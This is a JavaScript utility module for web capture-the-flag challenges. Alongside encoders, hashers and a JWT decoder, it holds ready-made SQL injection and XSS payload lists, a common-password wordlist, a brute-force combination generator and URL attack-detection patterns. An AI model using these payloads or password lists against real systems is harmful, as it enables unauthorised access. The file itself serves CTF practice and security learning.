/**
 * Advanced CTF Tools Module
 * Specialized utilities for web CTF challenges
 */

const chalk = require('chalk');
const crypto = require('crypto');

class CTFTools {
  /**
   * Decode JWT token
   */
  static decodeJWT(token) {
    try {
      const parts = token.split('.');
      if (parts.length !== 3) {
        throw new Error('Invalid JWT format');
      }

      const header = JSON.parse(Buffer.from(parts[0], 'base64').toString());
      const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
      const signature = parts[2];

      return {
        header,
        payload,
        signature,
        raw: token
      };
    } catch (error) {
      throw new Error(`JWT decode failed: ${error.message}`);
    }
  }

  /**
   * Print decoded JWT
   */
  static printJWT(jwt) {
    console.log(chalk.cyan.bold('\n🔑 JWT Token Analysis\n'));
    console.log(chalk.yellow('Header:'));
    console.log(JSON.stringify(jwt.header, null, 2));
    console.log(chalk.yellow('\nPayload:'));
    console.log(JSON.stringify(jwt.payload, null, 2));
    console.log(chalk.yellow('\nSignature:'));
    console.log(jwt.signature);
    console.log();
  }

  /**
   * Encode/Decode Base64
   */
  static base64Encode(text) {
    return Buffer.from(text).toString('base64');
  }

  static base64Decode(encoded) {
    return Buffer.from(encoded, 'base64').toString('utf-8');
  }

  /**
   * URL Encode/Decode
   */
  static urlEncode(text) {
    return encodeURIComponent(text);
  }

  static urlDecode(encoded) {
    return decodeURIComponent(encoded);
  }

  /**
   * Hex Encode/Decode
   */
  static hexEncode(text) {
    return Buffer.from(text).toString('hex');
  }

  static hexDecode(hex) {
    return Buffer.from(hex, 'hex').toString('utf-8');
  }

  /**
   * MD5 Hash
   */
  static md5(text) {
    return crypto.createHash('md5').update(text).digest('hex');
  }

  /**
   * SHA256 Hash
   */
  static sha256(text) {
    return crypto.createHash('sha256').update(text).digest('hex');
  }

  /**
   * Generate hash table for common passwords
   */
  static generateHashTable(passwords, algorithm = 'md5') {
    const table = {};
    passwords.forEach(pwd => {
      const hash = algorithm === 'md5' ? 
        this.md5(pwd) : 
        this.sha256(pwd);
      table[hash] = pwd;
    });
    return table;
  }

  /**
   * ROT13
   */
  static rot13(text) {
    return text.replace(/[a-zA-Z]/g, char => {
      const code = char.charCodeAt(0);
      const base = code >= 97 ? 97 : 65;
      return String.fromCharCode(((code - base + 13) % 26) + base);
    });
  }

  /**
   * Caesar cipher
   */
  static caesar(text, shift) {
    return text.replace(/[a-zA-Z]/g, char => {
      const code = char.charCodeAt(0);
      const base = code >= 97 ? 97 : 65;
      return String.fromCharCode(((code - base + shift) % 26) + base);
    });
  }

  /**
   * XOR encode/decode
   */
  static xor(text, key) {
    let result = '';
    for (let i = 0; i < text.length; i++) {
      result += String.fromCharCode(
        text.charCodeAt(i) ^ key.charCodeAt(i % key.length)
      );
    }
    return result;
  }

  /**
   * Extract emails from text
   */
  static extractEmails(text) {
    const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
    return text.match(emailRegex) || [];
  }

  /**
   * Extract URLs from text
   */
  static extractURLs(text) {
    const urlRegex = /(https?:\/\/[^\s]+)/g;
    return text.match(urlRegex) || [];
  }

  /**
   * Extract IP addresses
   */
  static extractIPs(text) {
    const ipRegex = /\b(?:\d{1,3}\.){3}\d{1,3}\b/g;
    return text.match(ipRegex) || [];
  }

  /**
   * Extract potential flags
   */
  static extractFlags(text, pattern = 'flag\\{[^}]+\\}') {
    const regex = new RegExp(pattern, 'gi');
    return text.match(regex) || [];
  }

  /**
   * Generate password variations
   */
  static generatePasswordVariations(base) {
    const variations = [
      base,
      base.toLowerCase(),
      base.toUpperCase(),
      base.charAt(0).toUpperCase() + base.slice(1),
      base + '123',
      base + '1',
      base + '!',
      base + '2024',
      '123' + base,
      base.split('').reverse().join('')
    ];
    return [...new Set(variations)];
  }

  /**
   * SQL injection payloads
   */
  static getSQLiPayloads() {
    return [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "' OR '1'='1' /*",
      "admin'--",
      "admin' #",
      "' UNION SELECT NULL--",
      "' UNION SELECT NULL,NULL--",
      "1' AND '1'='2",
      "1' AND '1'='1",
      "' AND 1=0 UNION ALL SELECT 'admin",
      "' OR 1=1--",
      "\" OR \"1\"=\"1",
      "' OR ''='",
      "1' OR '1' = '1",
      "' waitfor delay '00:00:05'--"
    ];
  }

  /**
   * XSS payloads
   */
  static getXSSPayloads() {
    return [
      '<script>alert(1)</script>',
      '"><script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg/onload=alert(1)>',
      'javascript:alert(1)',
      '<iframe src="javascript:alert(1)">',
      '<body onload=alert(1)>',
      '<input autofocus onfocus=alert(1)>',
      '\'-alert(1)-\'',
      '"><svg/onload=alert(1)>',
      '<marquee onstart=alert(1)>',
      '<details open ontoggle=alert(1)>'
    ];
  }

  /**
   * Generate common wordlist
   */
  static getCommonPasswords() {
    return [
      'admin', 'password', '123456', '12345678', 'qwerty',
      'abc123', 'monkey', '1234567', 'letmein', 'trustno1',
      'dragon', 'baseball', 'iloveyou', 'master', 'sunshine',
      'ashley', 'bailey', 'passw0rd', 'shadow', '123123',
      'password1', 'admin123', 'root', 'toor', 'test'
    ];
  }

  /**
   * Analyze password strength
   */
  static analyzePasswordStrength(password) {
    const analysis = {
      length: password.length,
      hasLower: /[a-z]/.test(password),
      hasUpper: /[A-Z]/.test(password),
      hasNumber: /\d/.test(password),
      hasSpecial: /[^a-zA-Z0-9]/.test(password),
      strength: 0
    };

    // Calculate strength
    if (analysis.length >= 8) analysis.strength += 20;
    if (analysis.length >= 12) analysis.strength += 10;
    if (analysis.length >= 16) analysis.strength += 10;
    if (analysis.hasLower) analysis.strength += 15;
    if (analysis.hasUpper) analysis.strength += 15;
    if (analysis.hasNumber) analysis.strength += 15;
    if (analysis.hasSpecial) analysis.strength += 15;

    analysis.level = analysis.strength < 40 ? 'Weak' :
                     analysis.strength < 70 ? 'Medium' : 'Strong';

    return analysis;
  }

  /**
   * Format hash for identification
   */
  static identifyHash(hash) {
    const length = hash.length;
    const patterns = {
      32: ['MD5', 'NTLM'],
      40: ['SHA1'],
      64: ['SHA256'],
      96: ['SHA384'],
      128: ['SHA512']
    };

    if (patterns[length]) {
      return patterns[length];
    }

    if (/^\$2[ayb]\$/.test(hash)) return ['bcrypt'];
    if (/^\$6\$/.test(hash)) return ['SHA512crypt'];
    if (/^\$5\$/.test(hash)) return ['SHA256crypt'];
    if (/^\$1\$/.test(hash)) return ['MD5crypt'];

    return ['Unknown'];
  }

  /**
   * Print encoding/decoding tools menu
   */
  static printToolsMenu() {
    console.log(chalk.cyan.bold('\n🛠️  CTF Tools Available\n'));
    
    const tools = [
      ['Encoding/Decoding', ''],
      ['  base64', 'Base64 encode/decode'],
      ['  url', 'URL encode/decode'],
      ['  hex', 'Hex encode/decode'],
      ['  rot13', 'ROT13 cipher'],
      ['', ''],
      ['Hashing', ''],
      ['  md5', 'Generate MD5 hash'],
      ['  sha256', 'Generate SHA256 hash'],
      ['  identify', 'Identify hash type'],
      ['', ''],
      ['JWT', ''],
      ['  jwt-decode', 'Decode JWT token'],
      ['', ''],
      ['Extraction', ''],
      ['  extract-emails', 'Find all emails'],
      ['  extract-urls', 'Find all URLs'],
      ['  extract-ips', 'Find all IPs'],
      ['  extract-flags', 'Find flags'],
      ['', ''],
      ['Payloads', ''],
      ['  sqli-payloads', 'SQL injection payloads'],
      ['  xss-payloads', 'XSS payloads'],
      ['  passwords', 'Common passwords']
    ];

    tools.forEach(([cmd, desc]) => {
      if (desc) {
        console.log(chalk.yellow(`  ${cmd.padEnd(20)}`), chalk.gray(desc));
      } else if (cmd) {
        console.log(chalk.white.bold(cmd));
      } else {
        console.log();
      }
    });

    console.log();
  }

  /**
   * HTML entity encode/decode
   */
  static htmlEncode(text) {
    const entities = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;'
    };
    return text.replace(/[&<>"']/g, char => entities[char]);
  }

  static htmlDecode(text) {
    const entities = {
      '&amp;': '&',
      '&lt;': '<',
      '&gt;': '>',
      '&quot;': '"',
      '&#39;': "'"
    };
    return text.replace(/&(?:amp|lt|gt|quot|#39);/g, entity => entities[entity]);
  }

  /**
   * Generate bruteforce combinations
   */
  static* generateCombinations(charset, minLen, maxLen) {
    function* generate(current, remaining) {
      if (current.length >= minLen) {
        yield current;
      }
      if (current.length < maxLen) {
        for (const char of charset) {
          yield* generate(current + char, remaining);
        }
      }
    }
    yield* generate('', maxLen);
  }

  /**
   * Check for common vulnerabilities in URL
   */
  static analyzeURL(url) {
    const findings = [];
    
    // Check for directory traversal
    if (url.includes('../') || url.includes('..\\')) {
      findings.push({
        type: 'warning',
        message: 'Potential directory traversal pattern detected'
      });
    }

    // Check for SQL injection indicators
    if (/['";]/.test(url)) {
      findings.push({
        type: 'warning',
        message: 'SQL injection characters detected'
      });
    }

    // Check for XSS indicators
    if (/<script|javascript:|onerror=/i.test(url)) {
      findings.push({
        type: 'warning',
        message: 'Potential XSS payload detected'
      });
    }

    // Check for SSRF indicators
    if (/localhost|127\.0\.0\.1|0\.0\.0\.0|169\.254/i.test(url)) {
      findings.push({
        type: 'info',
        message: 'Internal/local address detected - possible SSRF test'
      });
    }

    return findings;
  }
}

module.exports = CTFTools;
